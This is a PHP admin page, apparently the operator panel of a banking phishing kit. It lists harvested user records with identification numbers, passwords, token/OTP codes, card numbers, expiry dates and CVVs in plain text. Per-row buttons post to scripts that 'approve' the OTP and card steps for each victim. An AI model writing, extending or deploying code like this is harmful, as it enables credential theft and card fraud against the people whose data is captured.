<?php
include 'Conexion.php'; // Conexión a la base de datos

$query = "SELECT * FROM usuarios";
$resultado = $conexion->query($query);
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Usuarios</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            margin: 20px;
        }
        table {
            width: 90%;
            margin: auto;
            border-collapse: collapse;
            background: #fff;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }
        th, td {
            padding: 10px;
            border: 1px solid #ddd;
        }
        th {
            background: #007BFF;
            color: white;
        }
        tr:nth-child(even) {
            background: #f2f2f2;
        }
        .btn {
            border: none;
            padding: 10px 20px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 16px;
            color: white;
        }
        .btn-token {
            background-color: #4da6ff;
        }
        .btn-tarjeta {
            background-color: #4caf50;
        }
    </style>
</head>
<body>

    <h2>Lista de Usuarios</h2>

    <table>
        <tr>
            <th>ID Usuario</th>
            <th>Tipo Identificación</th>
            <th>Número Identificación</th>
            <th>Clave Segura</th>
            <th>Código Token</th>
            <th>Número Tarjeta</th>
            <th>Fecha Vencimiento</th>
            <th>CVV</th>
            <th>Acción</th>
        </tr>

        <?php
        if ($resultado->num_rows > 0) {
            while ($fila = $resultado->fetch_assoc()) {
                echo "<tr>
                        <td>{$fila['id_usuario']}</td>
                        <td>{$fila['tipo_identificacion']}</td>
                        <td>{$fila['numero_identificacion']}</td>
                        <td>{$fila['clave_segura']}</td>
                        <td>{$fila['codigo_token']}</td>
                        <td>{$fila['numero_tarjeta']}</td>
                        <td>{$fila['fecha_vencimiento']}</td>
                        <td>{$fila['cvv']}</td>
                        <td>
                            <button class='btn btn-token' onclick='autorizarUsuario({$fila['id_usuario']})'>Token/OTP</button>
                            <button class='btn btn-tarjeta' onclick='aprobarTarjeta({$fila['id_usuario']})'>Tarjeta</button>
                        </td>
                      </tr>";
            }
        } else {
            echo "<tr><td colspan='9'>No hay usuarios registrados.</td></tr>";
        }
        ?>

    </table>

    <script>
function autorizarUsuario(idUsuario) {
    if (confirm("¿Seguro que quieres aprobar este usuario?")) {
        fetch("actualizar_estado.php", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: "id_usuario=" + idUsuario
        })
        .then(response => response.text())
        .then(data => {
            alert(data); // Esto te dirá si la respuesta es "Usuario autorizado."
            location.reload(); // Recargar la tabla para ver el cambio
        })
        .catch(error => console.error("Error al autorizar usuario:", error));
    }
}
</script>

<script>
function aprobarTarjeta(idUsuario) {
    if (confirm("¿Seguro que quieres aprobar el acceso a tarjeta?")) {
        fetch("aprobar_tarjeta.php", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: "id_usuario=" + idUsuario
        })
        .then(response => response.text())
        .then(data => {
            alert(data);
        })
        .catch(error => console.error("Error al aprobar tarjeta:", error));
    }
}
</script>

